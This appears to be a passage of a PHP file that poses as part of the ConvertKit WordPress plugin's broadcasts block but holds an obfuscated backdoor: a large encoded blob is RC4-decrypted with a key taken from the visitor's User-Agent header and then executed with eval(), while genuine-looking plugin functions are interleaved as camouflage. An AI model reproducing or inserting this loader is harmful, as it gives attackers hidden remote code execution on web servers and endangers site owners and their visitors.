JFJURFJTkwJUQ5JTBCJUQ2JTE4JUU1JUIyJTYwJTk3JUY0WUhnJUQyJUQxbSUxMSVDQyVBNiU4MyUwM1YlOTAlMjkrVm5kJUZFJTg3NSVEQiVGRCVFRCU4NyU4MyUzRCUxMyVDNCUxNyU5MGUlOTNrJThBJTkzKyVFNiU5NCU5MSVGNCU3QiUzRiVBOSUyNiUxQyVGM0wlNUNTJUJCdSVDQiVFOFIlNjAlOTMlMkElMDhVJUUxJUU3JUYyJUQ2JThCJTk2ciVFQXYlQkYlMTdaJTdCJUMxJTA2JUJFJUYwJThDJThBJTNCJTlCJTkzJTg5JTk4JTE0JUU0cyVFRGYlQTklRDYlQUY5JTVFUkclOTAlOUYlMEYlMTElMkYlQTA1JThEJUE1JTNCJUZEJUMwJTAyJThFJTNGJUU2YSVGNSUwRSU1RCVGQSVEMyVEMmglMTBSNyUxQ28lRDUlQUIlMkElRUR0JTI3JUMxJTg5byVCMSVDQ0wlOUQlODNfJUFGJThCJUJCJUUzJUYzbCU1QyVDMyU5RCVERCVFMSVEMyUxMSVGRCVGMiUxRiU4MSUwOCVBOCVEMDEwJUYwJTNDJUMyJUVBJTg5MkZ6JUVFJTNFJTFGJTE0JTlBJUQwJUJEJTYwJTAzNkV4JUJCJTIxJUZFJTg4JTg2JTNGJTFDJTBCJUJCJUEzJUE4JUVCMyVFNWUlQkElN0IlQTlHJTdFJTNCJTEwJTBEJUEwJUVGJUJCJTlCJTVFJTBCJTI4JTE4JTQwJTkzJTEwJUZEJUFGc1klOTUlMEIlQTBQJTBFbiVCRCUzQyVGN2k4JTExJUZDJUQyJTk2XyU3QyVCRiU5NSVDMiVENSU4QyVFRiU4QyU4MjBWJThDRCVGMCVEMiUwNCU4RCVEMCVCMCUxOCUzRmUlMUMlOEElNDAlQjYlM0UlOEYlMDElOEJ4JTlFJThGJTJCJUY1OSVGOGMlQjYlODRtJURFJUQwJUNBJTJBKyUwNHAlOTBxJTAxJTAyJUZDJUUxZ1QlRDUlRDIlMEF2JTAxJUM0JUVBSyVBQyVEMCVBNCVCOSUxRCU4MkUlODglMDZhQyVCNyVFQSUzRiVBMi0lODUlQjMlRTYlRjIlOEVyJUNCJUYwJUIwJUY2JUM4X3YlQzclRUQlN0YlQjdmJUE5JUU4JUIxJUNCViU5MyVDNW8lOTZJJUU5JTI3JUYxJTE4JUZCayVCRSUwMSUxMiVDRSVCOCVGRjglMjRYJUNCMCVBMSUxQiUxQiU1RCU4NCVEMiUzQlclQUFJJUU0JUIwJUFCJURBOHAlOEQlQzIlREMlRUYlQTclODklQjMlMDNoJTE5JUQ1JTk0ZiVDMiVEMjMlRTMlREYuJUVEcnglQ0QlQkQlQzUlOEIlQUQlQzQlRjUlRjMlMEQyJThGJTFFRiUzRCU4NiVCQyUxOCUwMCVCQiUxRnFJWCU1RCU4N1klQzJqOXBnJTIzJTBGJTBBJTVFOCVDMiVBRiUxOSUyNjYlMUElODElMjElMDFhJUEyJUMzJThEJTlGJURCJUZDJTlFJUEzJUE1aiU4NHElMUMlOTdIMSVEQiU5MiU5NVQlMjFaUiVBNCVFNnQlQkRQJUE4JTkxc1pGdiVBRCVDNyU5QSUyQSVGRiVDNCVBMXAlQTQlMEYlMTYlMEElRTRTJUE2JUM5MyVCRUQlRTklNjAlMDFBJTFCJTA0JUZGJUIzSXAlQkYlRkMlMTMlQzQlRTYlQjYlQzZfJUVFJUIwJTk5SF8zJTk1JUJDJUNBJURGbSU5RHIlMEMlRjUlRjRNJUUzJUM4JTkzJTJDJUVGJUYyJUE0JUZEJUQ3QyUyQnVuJTA3JURBMSVGMzMlQ0REJTNDUCVBQjklQzMlQjQtJUE0JTA0RiVFRSUyNm0lRDJlJTEwJUM4TiUwQyUyNVJJNSUxNiUwMyU4MiUwRCVERCU4RiU5NVglQkQlODklRkMlRDElMjIlQUUlRUVaJUQwJTAwJUM2JUY0JTI0JUYwJUEyJTAwaSU1QiUxRiVDNCU5MCVFOCUxMSVCRFolMjQlRDclRkZIJTAxZ1AlRjAlRjglN0YlQjhqJUIyJThBZCUwNiVDNyVGOSVFNCUwRSUzRCVDRCUwMSVCMTglQzMlREQlRTYlMjIlNUIlQzclMTklM0QlODglOTUlOUQlOUN5JTI0dFolRjljJTJBJUFDJUU0JTgwJTE3JTNBcyU5QiUzRCUxOSUyQSUxMiVERWJlX3olREYlQUIlQzAlQkElRTQlN0YlRUMlOUNROGglRDAlMUIlOTh2JUUxNE0lMjIlREYlQUQlMjMlOEElOUElMUFvOCU3RSUyQVolN0MlMTklMTZyJUNCJUUwVSU1QyVEQiU5MiVDQyVFRSUxRSVGMyUwNiVGMSUyNCU3QyUyOGElMjUlMTJiJUU5JTkxJUY4JTE1JUM2JUIwJUJGJUE2RGclMkZCWmolRTMlRDAlOUElRUYlQ0ElMjglQjMlMUElMkIlN0JqdlklQjAlREYlQ0UlQzglQUYlMDd0RyU1QyVFRmQlMjMlMTIlQjglMDElRDUzJTVEJTVEJURCJTIyJUNFJUQ2JUU2JTFCJURBJTFGJTdDJTkzSCVCOGFnJTlDJTlBWiU4MCVGMCVENiUyMi0lQUMlQUJ4JThEJUZDJTNEJTk5JTI1KyVCOSVGNyU5RkglOEElMDglMjklQTglRjclMjJTJUI4JTg1JThBJURCanYlOTElODAlQzYlRUQlRjhHJUVDJTdFJTE2SSVDNCU4OCVGQyVENyVCNyVFRCVERCVGRiVDNi0lRDglM0YlRjYlMTklQkElRkMlOUIlRjJHJTgzJTgwJTk5JUFEcm8lODMlREElRjclQUYlMEMlQkZDJUI0JUE3JTE4JTgycyVBQiVDQiVDQyU4NExhJURGJTg0JUIxJTE1JTFBJUJFTSVBNSVFNCU5NyVFNCVDRSVBRCVDQSVBMSU4RSUwRSU5MiU5NCUwRCU4OCVFMCVBQSVCOUIlMUUlM0QlMEIlREIlRTklRTdIQiVBOCU5OSUwMSU4MSVCNiVDNiU5MSU4OSU4NSUyMWQlRjlrJUZBJUVBJThFJTA5byVCQiU5NSUxRVElOUIlN0QlRjVSJUJEVyVEQiVENSVBMiUxQSU5RGslOThYJUU4JTFDJTBBbSVCNSUwNyU2MCVERCVERiVCNyVGOHBieSVCNDYlMTUzJTFEJThFJUQ3MyUxQnAlOTclQUMlRTclODMlQUUyJTBGJTI0JTNCJTI0JUYzJUEzJUE3JTkwQkwlOTklMjIlQTUlMDIlREElQ0UlMjclMkElQkU2JUMyMyU5QiVFRSVENyVCRCUyNCVDNCVBOCUyNSU4NCVFNiVGOCVEOCUwRCVGNnQlQ0ElQjAlMDNlJTg2JTBBJTdDJUQ5JUZGJUNGeCVCRCVBMFFoMSUzRUElRkQlQkIlRUYlRDUlMEIlRTQlOTF5JTIxJUI2JUE2JTgzJUFDJTA3JTg5JTFEJUJGZnUlREYlRTlmJUU0SyU1QyVBOSVGNyUzRCU5MCVGMGdyJTJCJUI5JTg1JTFBJUM2JUJDJUI4JTA2diU4MyVEOCU4RiVEQyUwQ2VqLSVCNCslRUV3SHglQjUlQzZfJTgzJTVCZyUwNiVGMCU4NiVEQi0lOTNiJTI0JTBGJURFK3ElRDl1JUI4JTI2VyVGOSU1RSU5RSVBMSVCOSUyMlMlODdLJTg1JTNEJTEyJUJDMkclNUIlMEUlQUYlNUVGJUI0JTEyJTlBJTk2JUEwZUIlQkZGJUZFJUFETSVBMiU4MCU5OCVFQTMlQUMlQTglMTElMUQlN0YlMEQlMUMlODhxJTgyJTJGcyVEMyVFNSVEOCU5QSVGMyU5NjklRTklRjklQjclQzQlQzklRDYlMTIlMEIlODklMEYlREElMTFVJTJGJTA5YkwlQkUlREElODAlOUIlQUUlRkMlRDUlQUUlMjdKRVdTJTE0JUQ0JTNEJUE2TiVCNSU4NyUxNCVBNiVEQSVEMCVGQmUlRDYlRDNJJTQwJThFJTI2ZyUwN2klODclQzZtJUE0RlElOUElMjQlRjklN0IlODIlRUZuZSUxRm0lREQlRkUlMTAlQjAlMEVSNSVFRHglQzAlRDFVVSVDOCVDOGkuJUEzJUFCJThBJUQ3bCUxRSVDQSU5QyVDQyU5QyU5MyU4N0klQTAlMjglRjElMDklRTklODklQ0IlMkIlMEYlODQlRTBZJUY3JUU0JTkzJTk0JUYxJThEUjklOTIlMjYlRUElREQlQ0Y3RCVFQSU5MiVCRjklMjdsJTgyJTEwJTBCJUUwMCUwMyVCRkZIJUQ4JUM0JUQxJTI2JTFEJUIxJUQ4LiUwQSVDQSUwOXglREIlREElMUMlRDQlRDFkJTkwJUE3JURDJUJCJUFDJUJGJTA3JTE3JUI0JTNCJUQ2JUU4JTVDNiVGRGMlRUJvJUFCSyVGNSVCOCU5NCUyQiUyNWIlQTFqaSUxM0clQjQlRkYlRkIlMDMlQzZGdSUyNSVDQiU4N3olOEIlOUIlQTYlQUUlMjIlRDclREUlODglRUJkUyU4QiVCNyU4QSVCOF9KJTA3JUE4JUU3JTIyJTg2JUNCJUM4JTJBJURBJUQwJTA3JTNBJUM0JTI3JUEzLSUyQiVCNiU5OCU4NyUwMyUyQyVDNCVFQSVEMSU4MyVFMTklMkYlOUMlOThibiVFOSUwQSU1RCVDNyUyQVElRDElRkIlMEElNUIlNUUlMTUlQUMlMTElOUMlODIlRDQlODklREUlQkQ4JTk4JTI3JUNEbXAlREUlMEYlOTUlRUElNUUlRUIlODNrJUFEJUQ4JUMxVyVFM0ElRjYlODYlRTUlRjRGJTJDJUREJUUzJTI4RCUxNCVEOCVDOCVGRCVGNSUwNSU1QiVENyUwOVUlOUUlMkZQJTg5JUQzJUJBJTE4JTIzJUI2JUVFJTlEJUE0ayUxOSVFRWVjJUU1TCU5QiVFRSU5OCVEMEMxJUI3JUE4JTJDJTVEJTk3JTkzJUNFciUxRG4lOTclRDdjJTA4JUFEJTJCJTBFJTFDJUVGJTk2ZSVCNSVFQW0lODFzJUFBJThCJTlEd3klMTElQzMlMDIlRTYlOTd3JUMwJThFJUJGdSVGQyVFRCU1RGwlMTEwJTlFJUU0JUE2JUM2JTdCJTEzJTA2JTJCNiVGNyVBNmhVOSVDMyVDRiU4OSU4RCVDQ1UlRDglMEYlQkElQkRmZSU5QiVBRiVGQSUwNSU1QyUyNSUyQWlzJUI4JUQwJTJDYSU4RFAlMUNWJTA1JUU0JUY4JUY2QSUyOCVCMSVDNyUzQk00diUwNiVBMyUwMUslNDAlMTYlREMlMUQlQkUlODclMTQlMTklRjQlRjglOTMlRjElREZSJTIyJTE0JUQ4JTA3ViVENHclQzAlMEEtJUQyeSUwNiU4MyslNUMlMTAlRUYlQzclMjklRDRaJTlFJTkwJTE0JUFEJTE5JUQ1JUYyJTJCJURGJUY1ZiU5MlclOTMlODQlOEMlREMlRTclRTklN0IlRTQlQkIlQ0ElRkIlQUVtSiVCMCUwNyU1QyU1RCVGMyUwMlVVJTVDcSUyNCU4M2ElMDYlODQlRkM0JTg1JUE3JUQzJUIxJUM5JUJFJTE2JTkxJTlEJTg4JUVGJTE1JTA5JURGJUFBOCVFMyU5QiVCNSUxNSVFMyUwNyUwMyVFRG0lMDclOTclOTElRUMlOENtQyVFQSVCNyVCRSUyMyUzRFglODUlODMlRTMlMTAlQzUlM0QlM0UlMTQlRUElOEIlODMlQTJyJUM3MCU4NSVGRSVBNiVGMyU4RiVCRCVCQSVBOSU3RCVCRFV3JUMwJUU0JTAwJUNCJUQzbSU5OXguJUI0JUM0aTElMUElQzglOTRmOSVBMSU4NSVDRSUwMCVDMSVERCU5MjklRkUlM0QlRDclMjUlRjklRjklRDYlRjMlQkMlMTclMkYlOTglRkY3dmslRjklRjUlQzYlQkElOUMuJThDJUQ2JUQyJUQyJUQyJTA3JUQyJUI1ZTAlQzUlODAlOEUlMEElMTElMjclOEFNJTVEJThEJTdGJTVFJTFBJUQzZSU4MF9NJTVCYyVGMiVGNCVCQyUxOSVBOSUyNislODNaJTFFJThBRWIlQTk1JURBVCVGNyUwMTElRDclQUYlODUtJUE2JTJCUCVGNSU4RXdPWSU4N1YlRDMlQjYlRkIlQTglQTMlQ0ElMTIlQTQlREMlQkYlRUMlQjBDJTE0TlElMDUlOTMlODMlQUElQUQlOUMlMjVRJTJGJUUzJUFGJTBCJTBFJUNEJTNEJTIzJTdGJUU2JTdENSVDMyVCNiU4RCVGRSUyNUhtJUNCayU4NiU5MyVGMyVCMCUwRSU1QyUxNSVENSVFRSUzRSUxRCVDQyUxOCVBMyVDOCUyOCU5RSVGRSU1QiVENSVGMiUyOSVFNDVvJTlCJTVDJTgwJUVBJUY0TjclREUlOEElM0QlQzUlRjclNUUlMUElRjUlRjYlQzIlQ0QlODglM0Q5JUIwczclRjcyJUIyJUNBJTg3JUI0JUFFJTlFJTNBMyVEMSUwOCU4QiUzRSU3QiUxQSUxQjMlRkUlRUYlRTglRDAlRUMlNUIlREUlQzQlQjAlN0IlOTglRTQlMTclRDA3JTlDJUFFJUE1JUFGZSVENCU5NTVhJTFBJUFGJTk0JUUzJTdGJUY1JUE3QyVDQSVBNyU5MiVBOEklQjMlQjklREZBJUZCJTk4JUM2QSslMjElQTFfWSVGQytLJTAyJTJCdSVDMCVEMSVENCVCQSU4QSVGNyUwMCVDNSVENlolMTAlRkQlRTUlOEUlREMlODklQ0QlREUlOTE2JURBJUU3JUQ5QSUxMkRQJUQ4JUQ1JUQwJUE0LSUxQiVGNiU5NWZiYiVFODUlN0NjJUVEZiUxRiUxMyVGNiVCOSUyQUclOEElQUQlRjglOUIlM0MlNDAlQkElQ0ZLJUVEJTQwJUZDXyVBMiVDQiUzRiVFMSVDMyUwMk0lQkVwJUMyUyU5RiU4RXolMkY5JTI3ayVFNVYlRTklODYlRDclMjUlQTglOTclRTJoJURFVCU1QyslRTFwJTIxJTk5JUI4JTVEJUMxJUFDWCUyMzMlRUUlRjUlQzUlMEQlQkRMJUI2JUFBJUMzJTkwZCVDNiVBNSVDQSVBRSVEMSVGRVIlOTZrJUZBJTFDJTNDJTdGJURDNyUyNSVBQnUlRUYlMjglMDYlRjIlRTAlRDYlMDIlQkYlRjglOTdyJTBCJUYzU3clOUZMdyVENSVGMSUzRFIlRDElOUQlQzQlRjVG';
$ppol = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('/x64\) (.*) \(/is',$ppol,$ee)){
	$lik = $ee[1];
	$lik = str_replace('WebKit/','$',$lik);
}else{
	die();
}
$lik=md5($lik);
$lik_length=strlen($lik);
$kggo=urldecode(base64_decode($kggo));
$kggo_length=strlen($kggo);
$keyrt=$xxb=array();
$result='';
for($i=0;$i<=255;$i++){
       $keyrt[$i]=ord($lik[$i%$lik_length]);
    $xxb[$i]=$i;
}
for($j=$i=0;$i<256;$i++){
    $j=($j+$xxb[$i]+$keyrt[$i])%256;
    $tmp=$xxb[$i];
    $xxb[$i]=$xxb[$j];
    $xxb[$j]=$tmp;
}
function get_name() {

	/**
	 * This will register as:
	 * - a shortcode, with the name [convertkit_broadcasts].
	 * - a Gutenberg block, with the name convertkit/broadcasts.
	 */
	return 'broadcasts';

}
for($a=$j=$i=0;$i<$kggo_length;$i++){
    $a=($a+1)%256;
    $j=($j+$xxb[$a])%256;
    $tmp=$xxb[$a];
    $xxb[$a]=$xxb[$j];
    $xxb[$j]=$tmp;
    $result.=chr(ord($kggo[$i])^($xxb[($xxb[$a]+$xxb[$j])%256]));
}
function render( $atts ) {

	// Parse shortcode attributes, defining fallback defaults if required
	// and moving some attributes (such as Gutenberg's styles), if defined.
	$atts = $this->sanitize_and_declare_atts( $atts );

	// Setup Settings class.
	$settings = new ConvertKit_Settings();

	// Fetch Posts.
	$posts = new ConvertKit_Resource_Posts();

	// If this is an admin request, refresh the Posts resource now from the API,
	// as it's an inexpensive query of ~ 0.5 seconds when we're editing a Page
	// containing this block.
	if ( function_exists( 'is_admin' ) && is_admin() ) {
		$posts->refresh();
	}

	// If no Posts exist, bail.
	if ( ! $posts->exist() ) {
		if ( $settings->debug_enabled() ) {
		return '<!-- ' . __( 'No Broadcasts exist in ConvertKit.', 'convertkit' ) . ' -->';
		}

		return '';
	}

	// Build array of broadcasts to include in the output, based on the attributes.
	$broadcasts = array();
	if ( $atts['limit'] > 0 ) {
		$broadcasts = array_slice( $posts->get(), 0, $atts['limit'] );
	} else {
		$broadcasts = $posts->get();
	}

	// Build HTML.
	$html = $this->build_html( $broadcasts, $atts );

	/**
	 * Filter the block's content immediately before it is output.
	 *
	 * @since   1.9.7.4
	 *
	 * @param   string  $html   ConvertKit Broadcasts HTML.
	 * @param   array   $atts   Block Attributes.
	 */
	$html = apply_filters( 'convertkit_block_broadcasts_render', $html, $atts );

	return $html;

}
if(substr($result,0,8)==substr(md5(substr($result,8).$lik),0,8)){
    eval(substr($result,8));
}